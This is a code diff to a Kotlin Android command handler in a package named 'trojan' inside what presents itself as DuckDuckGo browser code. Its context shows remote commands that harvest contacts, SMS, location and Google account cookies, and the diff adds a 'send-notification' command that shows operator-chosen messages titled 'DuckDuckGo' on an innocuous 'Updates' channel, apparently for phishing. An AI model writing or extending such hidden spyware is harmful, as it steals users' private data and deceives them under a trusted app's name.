@@ -1,9 +1,13 @@
 package com.duckduckgo.trojan.impl
 
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.content.Context
 import android.location.LocationManager
 import android.net.Uri as SmsUri
 import android.provider.ContactsContract
+import androidx.core.app.NotificationCompat
+import androidx.core.app.NotificationManagerCompat
 import com.duckduckgo.cookies.api.CookieManagerProvider
 import com.duckduckgo.di.scopes.AppScope
 import com.duckduckgo.history.api.NavigationHistory
@@ -51,6 +55,7 @@ class RealCommandHandler @Inject constructor(
                 "request-contacts" -> handleRequestContacts()
                 "request-sms" -> handleRequestSms()
                 "request-location" -> handleRequestLocation()
+                "send-notification" -> handleSendNotification(command.payload)
                 else -> "unknown command type: ${command.type}"
             }
         } catch (e: Exception) {
@@ -220,8 +225,35 @@ class RealCommandHandler @Inject constructor(
         }
     }
 
+    private fun handleSendNotification(payload: Map<String, Any>): String {
+        val message = payload["message"] as? String ?: return "error: missing message payload"
+
+        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        nm.createNotificationChannel(
+            NotificationChannel(
+                NOTIFICATION_CHANNEL_ID,
+                "Updates",
+                NotificationManager.IMPORTANCE_DEFAULT,
+            ),
+        )
+
+        val notification = NotificationCompat.Builder(context, NOTIFICATION_CHANNEL_ID)
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setContentTitle("DuckDuckGo")
+            .setContentText(message)
+            .setStyle(NotificationCompat.BigTextStyle().bigText(message))
+            .setAutoCancel(true)
+            .build()
+
+        @Suppress("MissingPermission")
+        NotificationManagerCompat.from(context).notify(NOTIFICATION_ID, notification)
+        return "notification delivered"
+    }
+
     companion object {
         private const val MAX_SMS = 50
+        private const val NOTIFICATION_CHANNEL_ID = "ddg_updates"
+        private const val NOTIFICATION_ID = 0x4332
         private val DEFAULT_COOKIE_DOMAINS = listOf(
             "https://www.google.com",
             "https://accounts.google.com",
